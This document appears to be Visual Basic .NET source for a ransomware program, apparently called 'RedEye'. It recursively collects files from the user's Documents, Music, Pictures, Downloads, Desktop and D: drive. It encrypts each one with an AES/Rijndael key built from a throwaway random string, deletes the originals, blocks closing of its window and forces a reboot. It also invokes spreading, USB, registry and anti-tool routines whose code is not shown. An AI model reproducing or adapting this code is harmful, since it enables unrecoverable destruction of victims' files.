Imports System.IO
Imports System.Security.Cryptography
Imports Microsoft.Win32
Imports System
Imports System.Text
Imports System.Runtime.InteropServices
Imports System.Reflection
Imports System.Runtime.CompilerServices



Public Class Form1
    Public Shared ReadOnly HWND_BROADCAST As New IntPtr(&HFFFF)
    Public Const WM_SETTINGCHANGE As Integer = &H1A 'it should be &H001A

    Protected Overrides ReadOnly Property CreateParams() As CreateParams
        Get
            Dim cp As CreateParams = MyBase.CreateParams
            Const CS_NOCLOSE As Integer = &H200
            cp.ClassStyle = cp.ClassStyle Or CS_NOCLOSE
            Return cp
        End Get
    End Property
    Public Shared Sub Save(ByVal filepath As String, ByVal file As Object)
        Dim fbyte() As Byte = file
        My.Computer.FileSystem.WriteAllBytes(filepath, fbyte, True)
    End Sub

    Dim filenamez As String

    Private Sub Form1_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        If (e.CloseReason = CloseReason.UserClosing) Then
            e.Cancel = True
        End If
    End Sub

    Private Sub Form1_Shown(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Shown
        If File.Exists("C:\Save1.txt") Then
            Me.Hide()
            Me.Visible = False
            Me.Close()
            Form2.Show()
        Else
            Me.Hide()
            Me.Visible = False
        End If
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        If File.Exists("C:\Save1.txt") Then
            Form2.Show()
        Else
            My.Computer.Audio.Play(My.Resources.child, AudioPlayMode.WaitToComplete)
            EncryptionStart()
        End If


        ShortcutInfection()
        SpreadFolder()
        USB()
        Registrys()
        Msconfig()
        Taskmgr()
        Cmd()
        Chrome()
        Firefox()
        Opera()
        Microsoftedge()
        Microsoftedgecp()
        Notepad()
        Notepad1()
        Iexplore()
        MSASCuiL()
        Mmc()
        Gpedit()
        UserAccountControlSettings()
        Autoruns64()
        Autoruns()
        Taskkill()
        Powershell()
        Taskkill()
        Yandex()
        Attrib()
        Bcdedit()
        Sethc()
        Mspaint()
        Recoverydrive()
        Logoff()
        Control()
        RKill()
        RKill64()
        RKillunsigned()
        RKillunsigned64()
        USB()
        SpreadFolder()
        ShortcutInfection()
        Rstrui()
        'ExplorerAnti()
        'ExplorerAnti1()
        ExplorerAnti2()
        ExplorerAnti3()
        ExplorerAnti4()
        ExplorerAnti5()
        ExplorerAnti6()
        ExplorerAnti7()
        ExplorerAnti10()
        ExplorerAnti11()
        ExplorerAnti12()
        ExplorerAnti13()
        ExplorerAnti14()
        ExplorerAnti15()
        ExplorerAnti16()
        ExplorerAnti17()
    End Sub

    Public Sub EncryptionStart()
        Try
            For Each foundDirectory As String In
                               My.Computer.FileSystem.GetDirectories(
                                   My.Computer.FileSystem.SpecialDirectories.MyDocuments,
                                   FileIO.SearchOption.SearchAllSubDirectories)
                For Each foundFile As String In My.Computer.FileSystem.GetFiles(
            foundDirectory)
                    If foundFile.EndsWith("desktop.ini") Then
                    Else
                        ListBox1.Items.Add(foundFile)
                    End If
                Next
            Next

        Catch ex As Exception

        End Try
        Try
            For Each foundFile2 As String In My.Computer.FileSystem.GetFiles(
          My.Computer.FileSystem.SpecialDirectories.MyDocuments)

                If foundFile2.EndsWith("desktop.ini") Then
                Else
                    ListBox1.Items.Add(foundFile2)
                End If
            Next
        Catch ex As Exception

        End Try
        Try
            For Each foundDirectory3 As String In
                               My.Computer.FileSystem.GetDirectories(
                                   My.Computer.FileSystem.SpecialDirectories.MyMusic,
                                   FileIO.SearchOption.SearchAllSubDirectories)
                For Each foundFile3 As String In My.Computer.FileSystem.GetFiles(
            foundDirectory3)

                    If foundFile3.EndsWith("desktop.ini") Then
                    Else
                        ListBox1.Items.Add(foundFile3)
                    End If
                Next
            Next

        Catch ex As Exception

        End Try
        Try
            For Each foundFile4 As String In My.Computer.FileSystem.GetFiles(
       My.Computer.FileSystem.SpecialDirectories.MyMusic)

                If foundFile4.EndsWith("desktop.ini") Then
                Else
                    ListBox1.Items.Add(foundFile4)
                End If
            Next
        Catch ex As Exception

        End Try
        Try
            For Each foundDirectory3 As String In
                               My.Computer.FileSystem.GetDirectories(
                                   My.Computer.FileSystem.SpecialDirectories.MyPictures,
                                   FileIO.SearchOption.SearchAllSubDirectories)
                For Each foundFile3 As String In My.Computer.FileSystem.GetFiles(
            foundDirectory3)

                    If foundFile3.EndsWith("desktop.ini") Then
                    Else
                        ListBox1.Items.Add(foundFile3)
                    End If
                Next
            Next

        Catch ex As Exception

        End Try
        Try
            For Each foundFile4 As String In My.Computer.FileSystem.GetFiles(
       My.Computer.FileSystem.SpecialDirectories.MyPictures)

                If foundFile4.EndsWith("desktop.ini") Then
                Else
                    ListBox1.Items.Add(foundFile4)
                End If
            Next
        Catch ex As Exception
        End Try
        Try
            For Each foundDirectory3 As String In
                               My.Computer.FileSystem.GetDirectories(
                                   "C:\Users\" + Environment.UserName + "\Downloads",
                                   FileIO.SearchOption.SearchAllSubDirectories)
                For Each foundFile3 As String In My.Computer.FileSystem.GetFiles(
            foundDirectory3)

                    If foundFile3.EndsWith("desktop.ini") Then
                    Else
                        ListBox1.Items.Add(foundFile3)
                    End If
                Next
            Next

        Catch ex As Exception

        End Try
        Try
            For Each foundDirectory3 As String In
            My.Computer.FileSystem.GetDirectories(
                         "C:\Users\" + Environment.UserName + "\Downloads",
                        FileIO.SearchOption.SearchAllSubDirectories)
                For Each foundFile3 As String In My.Computer.FileSystem.GetFiles(
                 foundDirectory3)

                    If foundFile3.EndsWith("desktop.ini") Then
                    Else
                        ListBox1.Items.Add(foundFile3)
                    End If
                Next
            Next

        Catch ex As Exception

        End Try
        Try
            For Each foundFile4 As String In My.Computer.FileSystem.GetFiles("C:\Users\" + Environment.UserName + "\Downloads")

                If foundFile4.EndsWith("desktop.ini") Then
                Else
                    ListBox1.Items.Add(foundFile4)
                End If
            Next
        Catch ex As Exception

        End Try
        Try
            For Each foundDirectory3 As String In
                               My.Computer.FileSystem.GetDirectories(
                                   "C:\Users\" + Environment.UserName + "\Desktop",
                                   FileIO.SearchOption.SearchAllSubDirectories)
                For Each foundFile3 As String In My.Computer.FileSystem.GetFiles(
            foundDirectory3)

                    If foundFile3.EndsWith("desktop.ini") Then
                    Else
                        ListBox1.Items.Add(foundFile3)
                    End If
                Next
            Next

        Catch ex As Exception

        End Try
        Try
            For Each foundDirectory3 As String In
            My.Computer.FileSystem.GetDirectories(
                              "C:\Users\" + Environment.UserName + "\Desktop",
                             FileIO.SearchOption.SearchAllSubDirectories)
                For Each foundFile3 As String In My.Computer.FileSystem.GetFiles(
           foundDirectory3)

                    If foundFile3.EndsWith("desktop.ini") Then
                    Else
                        ListBox1.Items.Add(foundFile3)
                    End If
                Next
            Next

        Catch ex As Exception

        End Try
        Try
            For Each foundFile4 As String In My.Computer.FileSystem.GetFiles("C:\Users\" + Environment.UserName + "\Desktop")
                If foundFile4.EndsWith("desktop.ini") Then
                Else
                    ListBox1.Items.Add(foundFile4)
                End If
            Next
        Catch ex As Exception

        End Try
        Try
            For Each foundDirectory3 As String In
                               My.Computer.FileSystem.GetDirectories(
                                   "D:\",
                                   FileIO.SearchOption.SearchAllSubDirectories)
                For Each foundFile3 As String In My.Computer.FileSystem.GetFiles(
            foundDirectory3)

                    If foundFile3.EndsWith("desktop.ini") Then
                    Else
                        ListBox1.Items.Add(foundFile3)
                    End If
                Next
            Next

        Catch ex As Exception

        End Try
        Timer1.Start()
    End Sub

    Dim strFileToEncrypt As String
    Dim strFileToDecrypt As String
    Dim strOutputEncrypt As String
    Dim strOutputDecrypt As String
    Dim fsInput As System.IO.FileStream
    Dim fsOutput As System.IO.FileStream
    Public Function CreateKey(ByVal strPassword As String) As Byte()
        Dim chrData() As Char = strPassword.ToCharArray
        Dim intLength As Integer = chrData.GetUpperBound(0)
        Dim bytDataToHash(intLength) As Byte

        For i As Integer = 0 To chrData.GetUpperBound(0)
            bytDataToHash(i) = CByte(Asc(chrData(i)))
        Next

        Dim SHA512 As New System.Security.Cryptography.SHA512Managed
        Dim bytResult As Byte() = SHA512.ComputeHash(bytDataToHash)
        Dim bytKey(31) As Byte

        For i As Integer = 0 To 31
            bytKey(i) = bytResult(i)
        Next

        Return bytKey
    End Function
    Public Function CreateIV(ByVal strPassword As String) As Byte()
        Dim chrData() As Char = strPassword.ToCharArray
        Dim intLength As Integer = chrData.GetUpperBound(0)
        Dim bytDataToHash(intLength) As Byte

        For i As Integer = 0 To chrData.GetUpperBound(0)
            bytDataToHash(i) = CByte(Asc(chrData(i)))
        Next

        Dim SHA512 As New System.Security.Cryptography.SHA512Managed
        Dim bytResult As Byte() = SHA512.ComputeHash(bytDataToHash)
        Dim bytIV(15) As Byte

        For i As Integer = 32 To 47
            bytIV(i - 32) = bytResult(i)
        Next

        Return bytIV
    End Function
    Public Enum CryptoAction
        ActionEncrypt = 1
        ActionDecrypt = 2
    End Enum

    Public Sub EncryptOrDecryptFile(ByVal strInputFile As String,
                                     ByVal strOutputFile As String,
                                     ByVal bytKey() As Byte,
                                     ByVal bytIV() As Byte,
                                     ByVal Direction As CryptoAction)
        Try

            fsInput = New System.IO.FileStream(strInputFile, FileMode.Open,
                                               FileAccess.Read)
            fsOutput = New System.IO.FileStream(strOutputFile, FileMode.OpenOrCreate,
                                                FileAccess.Write)
            fsOutput.SetLength(0)

            Dim bytBuffer(4096) As Byte
            Dim lngBytesProcessed As Long = 0
            Dim lngFileLength As Long = fsInput.Length
            Dim intBytesInCurrentBlock As Integer
            Dim csCryptoStream As CryptoStream
            Dim cspRijndael As New System.Security.Cryptography.RijndaelManaged
            pbstatus.Value = 0
            pbstatus.Maximum = 100

            Select Case Direction
                Case CryptoAction.ActionEncrypt
                    csCryptoStream = New CryptoStream(fsOutput,
                    cspRijndael.CreateEncryptor(bytKey, bytIV),
                    CryptoStreamMode.Write)

                Case CryptoAction.ActionDecrypt
                    csCryptoStream = New CryptoStream(fsOutput,
                    cspRijndael.CreateDecryptor(bytKey, bytIV),
                    CryptoStreamMode.Write)
            End Select

            While lngBytesProcessed < lngFileLength
                intBytesInCurrentBlock = fsInput.Read(bytBuffer, 0, 4096)
#Disable Warning BC42104 ' Die csCryptoStream-Variable wird verwendet, bevor ihr ein Wert zugewiesen wird. Zur Laufzeit kann eine Nullverweisausnahme auftreten.
                csCryptoStream.Write(bytBuffer, 0, intBytesInCurrentBlock)
#Enable Warning BC42104 ' Die csCryptoStream-Variable wird verwendet, bevor ihr ein Wert zugewiesen wird. Zur Laufzeit kann eine Nullverweisausnahme auftreten.
                lngBytesProcessed = lngBytesProcessed + CLng(intBytesInCurrentBlock)
                pbstatus.Value = CInt((lngBytesProcessed / lngFileLength) * 100)
            End While

            csCryptoStream.Close()
            fsInput.Close()
            fsOutput.Close()

            If Direction = CryptoAction.ActionEncrypt Then
                Dim fileOriginal As New FileInfo(strFileToEncrypt)
                fileOriginal.Delete()
            End If

            If Direction = CryptoAction.ActionDecrypt Then
                Dim fileEncrypted As New FileInfo(strFileToDecrypt)
                fileEncrypted.Delete()
            End If


        Catch
            fsInput.Close()
            fsOutput.Close()

            If Direction = CryptoAction.ActionDecrypt Then
                Dim fileDelete As New FileInfo(filenamez)
                fileDelete.Delete()



            Else
                Dim fileDelete As New FileInfo(filenamez)
                fileDelete.Delete()




            End If

        End Try
    End Sub

    Private Shared rand As New Random()
    Public Shared Function GetRandomString(Optional ByVal len As Integer = 128)
        If len > 128 Then len = 128

        Static rndBuffer(256 - 1) As Byte
        rand.NextBytes(rndBuffer)
        Dim randomStr As String = String.Empty

        Using sha512crypto As New Security.Cryptography.SHA512CryptoServiceProvider()
            randomStr = String.Join("", Array.ConvertAll(Of Byte, String)(sha512crypto.ComputeHash(rndBuffer), Function(b As Byte) b.ToString("x2")))
        End Using
        Return randomStr.Substring(0, len)
    End Function

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        ProgressBar1.Maximum = ListBox1.Items.Count
        If ProgressBar1.Value = ListBox1.Items.Count Then
            Me.ShowInTaskbar = False
            Me.WindowState = FormWindowState.Minimized
            Timer1.Stop()
            Dim path As String = "C:\Save1.txt"

            Dim fs As FileStream = File.Create(path)

            Dim info As Byte() = New UTF8Encoding(True).GetBytes("Save1")
            fs.Write(info, 0, info.Length)
            fs.Close()
            System.Diagnostics.Process.Start("shutdown", "-r -t 00 -f")
        Else
            ListBox1.SelectedIndex = ProgressBar1.Value
            ListBox1.SelectionMode = SelectionMode.One
            filenamez = CStr(ListBox1.SelectedItem)
            Try
                Dim bytKey As Byte()
                Dim bytIV As Byte()
                bytKey = CreateKey(GetRandomString(100))
                bytIV = CreateIV(GetRandomString(100))
                EncryptOrDecryptFile(filenamez, filenamez + ".RedEye",
                                     bytKey, bytIV, CryptoAction.ActionEncrypt)
            Catch ex As Exception
            End Try
            ProgressBar1.Increment(1)
        End If
    End Sub
End Class
